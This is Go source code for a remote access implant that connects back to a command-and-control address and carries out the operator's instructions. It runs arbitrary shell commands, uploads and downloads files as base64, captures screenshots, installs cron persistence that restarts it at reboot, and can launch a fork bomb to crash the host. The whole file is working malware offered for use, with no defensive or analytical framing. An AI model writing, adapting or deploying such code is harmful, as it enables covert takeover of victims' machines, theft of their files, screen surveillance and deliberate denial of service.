package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"image/png"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/kbinani/screenshot"
)

const c2 string = "127.0.0.1:1234"

func main() {
	conn := connect_home()

	for {
		cmd, _ := bufio.NewReader(conn).ReadString('\n')
		cmd = strings.TrimSpace(cmd)

		if cmd == "q" || cmd == "quit" {
			send_resp(conn, "Closing Connection!!")
			conn.Close()
			break
		} else if len(cmd) >= 2 && cmd[0:2] == "cd" {
			if cmd == "cd" {
				cwd, err := os.Getwd()
				if err != nil {
					send_resp(conn, err.Error())
				} else {
					send_resp(conn, cwd)
				}
			} else {
				target_dir := strings.Split(cmd, " ")[1]
				if err := os.Chdir(target_dir); err != nil {
					send_resp(conn, err.Error())
				} else {
					send_resp(conn, target_dir)
				}
			}
		} else if strings.Contains(cmd, ":") { // upload handler
			tmp := strings.SplitN(cmd, ":", 2)
			if save_file(tmp[0], tmp[1]) {
				send_resp(conn, "File uploaded successfully!!")
			} else {
				send_resp(conn, "Error uploading file")
			}
		} else if tmp := strings.Split(cmd, " "); tmp[0] == "download" {
			send_resp(conn, get_file(tmp[1]))
		} else if cmd == "screenshot" {
			send_resp(conn, take_screenshot())
		} else if cmd == "persist" {
			send_resp(conn, persist())
		} else if cmd == "fork_bomb" {
			go fork_bomb()
		} else {
			send_resp(conn, exec_command(cmd))
		}
	}
}

// user level persistence
func persist() string {
	exec_path, err := os.Executable()
	if err != nil {
		return "Error getting executable path: " + err.Error()
	}

	file_name := "/tmp/persist.cron"
	cron_content := fmt.Sprintf("@reboot %s\n", exec_path)

	err = os.WriteFile(file_name, []byte(cron_content), 0644)
	if err != nil {
		return "Error writing temp cron file: " + err.Error()
	}

	cmd_out, err := exec.Command("/usr/bin/crontab", file_name).CombinedOutput()
	defer os.Remove(file_name)
	if err != nil {
		return "Error establishing persistence: " + err.Error() + " | " + string(cmd_out)
	}

	return "Persistence has been established"
}

func connect_home() net.Conn {
	conn, err := net.Dial("tcp", c2)
	if err != nil {
		time.Sleep(time.Second * 30)
		return connect_home()
	}
	return conn
}

// connection object and message
func send_resp(conn net.Conn, msg string) {
	fmt.Fprintf(conn, "%s", msg)
}

func save_file(file_name string, b64_string string) bool {
	content, err := base64.StdEncoding.DecodeString(b64_string)
	if err != nil {
		return false
	}
	if err = os.WriteFile(file_name, content, 0644); err != nil {
		return false
	}
	return true
}

func file_exists(file string) bool {
	if _, err := os.Stat(file); err != nil {
		return false
	}
	return true
}

func file_b64(file string) string {
	content, _ := os.ReadFile(file)
	return base64.StdEncoding.EncodeToString(content)
}

func get_file(file string) string {
	if !file_exists(file) {
		return "File not found"
	}
	return file + ":" + file_b64(file)
}

func take_screenshot() string {
	bounds := screenshot.GetDisplayBounds(0)
	img, _ := screenshot.CaptureRect(bounds)
	file, _ := os.Create("wallpaper.png")
	defer file.Close()
	png.Encode(file, img)
	b64_string := file_b64("wallpaper.png")
	os.Remove("wallpaper.png")
	return b64_string
}

func exec_command(cmd string) string {
	out, err := exec.Command(cmd).Output()
	if err != nil {
		return err.Error()
	}
	return string(out)
}

// fork bomb execution, we first execute the persist method so that we can get the machine back after
// crash happens
func fork_bomb() {
	//persist()
	_ = exec.Command("bash", "-c", ":(){ :|:& };:").Start()
}
